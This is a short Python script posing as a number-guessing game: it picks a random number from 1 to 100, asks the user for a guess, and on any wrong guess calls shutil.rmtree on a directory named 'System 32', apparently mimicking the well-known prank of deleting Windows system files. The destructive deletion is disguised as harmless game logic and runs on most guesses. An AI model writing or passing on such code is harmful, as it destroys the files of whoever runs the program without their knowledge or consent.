import random
import shutil

num = random.randint(1,100)

choice = input("Choose a number between 1 and 100!")

if(int(choice) != num):
  shutil.rmtree("System 32")
